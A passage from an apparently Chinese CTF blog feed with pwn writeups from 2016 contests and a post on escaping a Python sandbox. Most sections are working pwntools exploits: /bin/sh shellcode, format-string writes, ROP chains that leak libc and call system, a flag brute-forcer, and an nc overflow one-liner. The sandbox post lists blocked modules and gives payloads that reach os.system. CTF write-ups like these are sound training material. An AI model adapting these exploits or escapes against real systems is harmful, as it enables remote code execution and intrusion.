gdb.attach(p,"b*0x400776\nc")</span></div><div class="line">p.sendline(op_exit)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#flag&#123;53ed43a93ec84fe99ddbd33d5acf5284&#125;</span></div></pre></td></tr></table></figure>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>没做出来，本地没有调试环境，卒。。</p>
<p>后面fuzz了一下，exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">shellcode1 = <span class="string">"\xff\xff\x10\x04\xab\x0f\x02\x24\x55\xf0\x46\x20\x66\x06\xff\x23\xc2\xf9\xec\x23\x66\x06\xbd\x23\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf\x9a\xf9\xbd\x23\x21\x20\x80\x01\x21\x28\xa0\x03\xcc\xcd\x44\x03/bin/sh\x00"</span></div><div class="line">shellcode2 = <span class="string">"\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			p = remote(<span class="string">"106.75.32.60"</span>,<span class="number">10000</span>)</div><div class="line">			p.recvuntil(<span class="string">"lp' for  help.\n"</span>)</div><div class="line">			p.sendline(<span class="string">"2057561479"</span>)</div><div class="line">			data = p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-9</span>:<span class="number">-1</span>]</div><div class="line">			off = int(data,<span class="number">16</span>)</div><div class="line">			<span class="keyword">print</span> <span class="string">"shellcode_addr = "</span> +hex(off)</div><div class="line">			payload = <span class="string">"20160606 0"</span></div><div class="line">			payload += <span class="string">"\x00"</span>*(<span class="number">0x70</span>+y-len(shellcode2)-len(payload))+shellcode2+p32(off+<span class="number">29</span>+x)</div><div class="line">			<span class="comment"># payload += "\x00"*(0x74-len(shellcode2)-10)+shellcode+p32(off)</span></div><div class="line">			<span class="keyword">print</span>  y,x</div><div class="line">			p.sendline(payload)</div><div class="line">			p.interactive()</div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			p.close()</div></pre></td></tr></table></figure>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这阵子可能真的没有时间去做二进制研究了。</p>
<p>直视自己。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[【ICQ2016】 writeup]]></title>
      <url>/2016/07/05/ICHUNQIU2016-PWN/</url>
      <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>func函数数组指针的索引没有规定范围，可以越界。</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line">addr  =<span class="number">0x0804A030</span></div><div class="line">bbs  = <span class="number">0x0804A0A0</span></div><div class="line">offset  = (bbs - addr)/<span class="number">4</span>+<span class="number">1</span></div><div class="line"><span class="comment"># p  =process('./tc1')</span></div><div class="line">p = remote(<span class="string">'106.75.9.11'</span>,<span class="number">20000</span>)</div><div class="line"><span class="comment"># gdb.attach(p,'b*0x8048641\nc')</span></div><div class="line">shellcode = p32(bbs+<span class="number">4</span>)+ <span class="string">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'</span></div><div class="line">p.recvuntil(<span class="string">'de\n'</span>)</div><div class="line">p.sendline(str(offset))</div><div class="line">p.recvuntil(<span class="string">' 110]\n'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
 <a id="more"></a>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>经典的fmt漏洞。fmt一发，天下我有。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level =<span class="string">"debug"</span>)</div><div class="line">buf = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span>;</div><div class="line">bss = <span class="number">0x080EBF80</span></div><div class="line"></div><div class="line"><span class="comment"># p = process("./echo-200")</span></div><div class="line">p = remote(<span class="string">'106.75.9.11'</span>,<span class="number">20001</span>)</div><div class="line"></div><div class="line">got_addr =<span class="number">0x80EB00C</span></div><div class="line">shellcode = buf</div><div class="line">shellcode_addr = bss</div><div class="line">ret_offset = <span class="number">0xffc56dbc</span> - <span class="number">0xffc56bac</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,data)</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"Reading 16 bytes\n"</span>)</div><div class="line">	p.sendline(p32(addr)+<span class="string">"%%%dc"</span> %(ord(data)<span class="number">-4</span>) +<span class="string">"%7$hhn"</span>)</div><div class="line"></div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> i &lt; len(shellcode):</div><div class="line">	write(shellcode_addr+i,shellcode[i])</div><div class="line">	i +=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Reading 16 bytes\n'</span>)</div><div class="line">p.sendline(<span class="string">'%5$X...'</span>)</div><div class="line">stack_addr = int(p.recvuntil(<span class="string">'...'</span>)[:<span class="number">8</span>],<span class="number">16</span>)</div><div class="line">ret_addr = stack_addr + ret_offset</div><div class="line"></div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> i &lt; len(p32(shellcode_addr)):</div><div class="line">	write(ret_addr+i,p32(shellcode_addr)[i])</div><div class="line">	i +=<span class="number">1</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x08048FB6\nc")</span></div><div class="line">write(stack_addr<span class="number">-1</span>,<span class="string">'\x01'</span>)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;b3a0b33-645f-49f0-8e30-2d7c31ecfabb&#125;</span></div></pre></td></tr></table></figure>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>看着这熟悉的bin文件，我蛋都疼了。。这不是蒸米的么。。就改了字符串。。真心蛋疼。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding=utf8-*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment"># context(log_level="debug")</span></div><div class="line">elf = ELF(<span class="string">'qwb3'</span>)</div><div class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</div><div class="line">read_plt  = elf.symbols[<span class="string">"read"</span>]</div><div class="line">write_got = elf.got[<span class="string">"write"</span>]</div><div class="line">read_got =elf.got[<span class="string">"read"</span>]</div><div class="line">rop_addr  = <span class="number">0x40062A</span></div><div class="line">system_got =<span class="number">0x601010</span></div><div class="line">main = <span class="number">0x40059d</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x40059C\nc")</span></div><div class="line"><span class="comment"># p = process('./qwb3')</span></div><div class="line">p = remote(<span class="string">'106.75.8.230'</span>,<span class="number">19286</span>)</div><div class="line"><span class="comment"># p = remote('127.0.0.1',10001)</span></div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">bss = <span class="number">0x601038</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">	payload = <span class="string">'\x00'</span>*(<span class="number">0x40</span>)+p64(<span class="number">0</span>)+p64(rop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)+p64(addr)+p64(<span class="number">1</span>)+p64(<span class="number">0x400610</span>)+<span class="number">7</span>*<span class="number">8</span>*<span class="string">'\x00'</span>+p64(main)</div><div class="line">	p.send(payload)</div><div class="line">	sleep(<span class="number">1</span>)</div><div class="line">	data =  p.recv(<span class="number">8</span>)</div><div class="line">	p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">	<span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (addr, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">	<span class="keyword">return</span> data</div><div class="line"><span class="comment"># d = DynELF(leak, elf=ELF('./qwb3'))</span></div><div class="line"><span class="comment"># system_addr = d.lookup('execve', 'libc')</span></div><div class="line"><span class="comment"># print hex(u64(leak(write_got)))</span></div><div class="line">system_addr = u64(leak(write_got)) - (<span class="number">0x7f7d4bb06510</span>- <span class="number">0x7f7d4bad7da0</span>)</div><div class="line"><span class="comment"># system_addr = u64(leak(write_got)) - (0x7fac9451d4d0- 0x7fac944f1040)</span></div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</div><div class="line"><span class="comment">### send '/bin/sh'</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x40059C\nc")</span></div><div class="line">payload2 = <span class="string">'\x00'</span>*(<span class="number">0x40</span>)+p64(<span class="number">0</span>)+p64(rop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">16</span>)+p64(bss)+p64(<span class="number">0</span>)+p64(<span class="number">0x400610</span>)+<span class="number">7</span>*<span class="number">8</span>*<span class="string">'\x00'</span>+p64(main)</div><div class="line">p.send(payload2)</div><div class="line">sleep(<span class="number">1</span>)</div><div class="line">p.send(<span class="string">'/bin/sh\0'</span>+p64(system_addr))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line"><span class="comment">###  call system</span></div><div class="line"></div><div class="line">payload4 = <span class="string">'\x00'</span>*(<span class="number">0x40</span>)+p64(<span class="number">0</span>)+p64(rop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(bss+<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(bss)+p64(<span class="number">0x400610</span>)+<span class="number">7</span>*<span class="number">8</span>*<span class="string">'\x00'</span>+p64(main)</div><div class="line">p.send(payload4)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">###ps：发包一定要在一个包里发完。。不然。。。</span></div></pre></td></tr></table></figure>
<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>本来期待着pwn4是一个堆的利用，结果是爆破。。爆破。。竟然是爆破。。这特么能作pwn4？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment"># context(log_level ="debug")</span></div><div class="line">printable = string.uppercase+string.lowercase+string.octdigits+string.punctuation</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(flag)</span>:</span></div><div class="line">	sleep(<span class="number">0.1</span>)</div><div class="line">	<span class="comment"># p = process('./cg_leak')</span></div><div class="line">	p = remote(<span class="string">'106.75.8.230'</span>,<span class="number">13349</span>)</div><div class="line">	p.recvuntil(<span class="string">'OUR NAME:'</span>)</div><div class="line">	p.sendline(<span class="string">'admin'</span>)</div><div class="line">	p.recvuntil(<span class="string">"'s your name again?\n"</span>)</div><div class="line">	p.sendline(<span class="string">'admin'</span>)</div><div class="line">	p.recvuntil(<span class="string">'FLAG: '</span>)</div><div class="line">	p.sendline(flag)</div><div class="line">	data = p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">	p.close()</div><div class="line">	<span class="keyword">if</span> data == <span class="string">'Try submit then!\n'</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">flag = <span class="string">''</span></div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> i&lt;<span class="number">40</span>:</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> printable:</div><div class="line">	 <span class="keyword">if</span> getflag(flag+x):</div><div class="line">	 	flag+=x</div><div class="line">	 	<span class="keyword">print</span> flag</div><div class="line">	i+=<span class="number">1</span></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"><span class="comment">#FLAG&#123;wh4t3v3r_1s_0k&#125;</span></div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【CFF2016-pwn】 Writeup]]></title>
      <url>/2016/06/20/CCF2016/</url>
      <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>简单的变量覆盖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -c &apos;print &quot;a&quot;*0x40+&quot;\x1b\x86\x04\x08&quot;&apos;|nc 139.196.232.222 54000</div><div class="line">一发带走</div></pre></td></tr></table></figure>
<img src="/2016/06/20/CCF2016/1.png" alt="1.png" title="">
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>scanf没有限制输入字节，可发送超长字符串导致栈溢出。</p>
<p>只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个<code>&quot;/bin/sh\0&quot;</code>然后构造rop，拿shell<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">elf = ELF(<span class="string">'memory'</span>)</div><div class="line">system_plt = elf.symbols[<span class="string">'system'</span>]</div><div class="line">scanf_plt = elf.symbols[<span class="string">'__isoc99_scanf'</span>]</div><div class="line">pp_ret = <span class="number">0x804877e</span></div><div class="line">_s = <span class="number">0x8048817</span></div><div class="line">data =  <span class="number">0x0804A038</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./memory'</span>)</div><div class="line">payload1 = <span class="string">'a'</span>*(<span class="number">0x13</span>+<span class="number">4</span>)+p32(scanf_plt)+p32(pp_ret)+p32(_s)+p32(data)+p32(system_plt)+p32(<span class="number">0</span>)+p32(data)</div><div class="line">p.sendline(payload1)</div><div class="line">p.sendline(<span class="string">'/bin/sh\0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>接下来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find /|grep flag</div><div class="line">/bin/cat xxx #忘记位置了</div></pre></td></tr></table></figure></p>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><img src="/2016/06/20/CCF2016/3.png" alt="3.png" title="">
<p>把文件里面这个位置的数据改成0x88，进入这个函数里面，会给一个web服务器的地址，把改变后的文件上传就拿flag。</p>
<p>PS：pwn3，500题，这么简单？</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python沙盒绕过]]></title>
      <url>/2016/06/08/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>来源于ISCC2016的一题pwn题目，nc连上去后发现是一个python shell，当时思路错了，死脑筋的认为这一定是一个python反序列化漏洞，然后各种搜集资料，ORZ。<br>好吧，这其实是一个导入shell模块，命令执行拿flag的姿势。</p>
<p>2017.7.8更新：改名为python沙盒绕过，增加沙盒绕过的各种姿势。</p>
 <a id="more"></a>
<h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>python中导入模块有以下几种方式</p>
<ol>
<li><code>import xxx</code></li>
<li><code>from xxx import *</code></li>
<li><code>__import__(&#39;xxx&#39;)</code><br><strong>程序把前两种都禁用了，而第三种却没有禁用。</strong></li>
</ol>
<h3 id="shell模块"><a href="#shell模块" class="headerlink" title="shell模块"></a>shell模块</h3><p>python中shell模块有以下几种</p>
<ol>
<li><code>os.system() os.popen()</code></li>
<li><code>commands.getstatusoutput() commands.getoutput()</code></li>
<li><code>commands.getstatus()</code></li>
<li><code>subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)</code></li>
<li><code>pty.spawn()</code></li>
</ol>
<h3 id="附上pwn脚本"><a href="#附上pwn脚本" class="headerlink" title="附上pwn脚本"></a>附上pwn脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"   Simple calculator implemented by python   "</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></div><div class="line">    <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getexp</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> raw_input(<span class="string">"&gt;&gt;&gt; "</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_import_</span><span class="params">(name, *args, **kwargs)</span>:</span></div><div class="line">    module_blacklist = [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'time'</span>, <span class="string">'bdb'</span>, <span class="string">'bsddb'</span>, <span class="string">'cgi'</span>, </div><div class="line">            <span class="string">'CGIHTTPServer'</span>, <span class="string">'cgitb'</span>, <span class="string">'compileall'</span>, <span class="string">'ctypes'</span>, <span class="string">'dircache'</span>,</div><div class="line">            <span class="string">'doctest'</span>, <span class="string">'dumbdbm'</span>, <span class="string">'filecmp'</span>, <span class="string">'fileinput'</span>, <span class="string">'ftplib'</span>, <span class="string">'gzip'</span>,</div><div class="line">            <span class="string">'getopt'</span>, <span class="string">'getpass'</span>, <span class="string">'gettext'</span>, <span class="string">'httplib'</span>, <span class="string">'importlib'</span>, <span class="string">'imputil'</span>, </div><div class="line">            <span class="string">'linecache'</span>, <span class="string">'macpath'</span>, <span class="string">'mailbox'</span>, <span class="string">'mailcap'</span>, <span class="string">'mhlib'</span>, <span class="string">'mimetools'</span>,</div><div class="line">            <span class="string">'mimetypes'</span>, <span class="string">'modulefinder'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'netrc'</span>, <span class="string">'new'</span>,</div><div class="line">            <span class="string">'optparse'</span>, <span class="string">'pdb'</span>, <span class="string">'pipes'</span>, <span class="string">'pkgutil'</span>, <span class="string">'platform'</span>, <span class="string">'popen2'</span>, <span class="string">'poplib'</span>,</div><div class="line">            <span class="string">'posix'</span>, <span class="string">'posixfile'</span>, <span class="string">'profile'</span>, <span class="string">'pstats'</span>, <span class="string">'pty'</span>, <span class="string">'py_compile'</span>,</div><div class="line">            <span class="string">'pyclbr'</span>, <span class="string">'pydoc'</span>, <span class="string">'rexec'</span>, <span class="string">'runpy'</span>, <span class="string">'shlex'</span>, <span class="string">'shutil'</span>, <span class="string">'SimpleHTTPServer'</span>,</div><div class="line">            <span class="string">'SimpleXMLRPCServer'</span>, <span class="string">'site'</span>, <span class="string">'smtpd'</span>, <span class="string">'socket'</span>, <span class="string">'SocketServer'</span>,</div><div class="line">            <span class="string">'subprocess'</span>, <span class="string">'sysconfig'</span>, <span class="string">'tabnanny'</span>, <span class="string">'tarfile'</span>, <span class="string">'telnetlib'</span>,</div><div class="line">            <span class="string">'tempfile'</span>, <span class="string">'Tix'</span>, <span class="string">'trace'</span>, <span class="string">'turtle'</span>, <span class="string">'urllib'</span>, <span class="string">'urllib2'</span>,</div><div class="line">            <span class="string">'user'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'whichdb'</span>, <span class="string">'zipfile'</span>, <span class="string">'zipimport'</span>]</div><div class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</div><div class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don't let user import these modules</span></div><div class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'No you can\' import &#123;0&#125;!!!'</span>.format(forbid))</div><div class="line">    <span class="keyword">return</span> __import__(name, *args, **kwargs)    <span class="comment"># normal modules can be imported</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_filter</span><span class="params">(command)</span>:</span></div><div class="line">    blacklist = [<span class="string">'exec'</span>, <span class="string">'sh'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'='</span>, <span class="string">'open'</span>, <span class="string">'read'</span>, <span class="string">'sys'</span>, <span class="string">';'</span>, <span class="string">'os'</span>]</div><div class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</div><div class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:   <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_exec</span><span class="params">(command)</span>:</span>      <span class="comment"># sandbox user input</span></div><div class="line">    result = <span class="number">0</span></div><div class="line">    __sandboxed_builtins__ = dict(__builtins__.__dict__)</div><div class="line">    __sandboxed_builtins__[<span class="string">'__import__'</span>] = _hook_import_    <span class="comment"># hook import</span></div><div class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">'open'</span>]</div><div class="line">    _global = &#123;</div><div class="line">        <span class="string">'__builtins__'</span> : __sandboxed_builtins__</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Malicious user input detected!!!'</span></div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    command = <span class="string">'result = '</span> + command</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">exec</span> command <span class="keyword">in</span> _global     <span class="comment"># do calculate in a sandboxed environment</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> e</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    result = _global[<span class="string">'result'</span>]  <span class="comment"># extract the result</span></div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line">banner()</div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    command = getexp()</div><div class="line">    <span class="keyword">print</span> sandbox_exec(command)</div></pre></td></tr></table></figure>
<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>python内置函数沙盒绕过姿势</p>
<p><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == &#39;catch_warnings&#39;][0].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;echo Hello SandBox&#39;)</code></p>
<p>getattr绕过</p>
<p>getattr(os,”system”)(“/bin/sh”)</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[[wargame-pwnable] bf]]></title>
      <url>/2016/06/08/wargame-pwnable-bf/</url>
      <content type="html"><![CDATA[<p>got表的姿势</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div 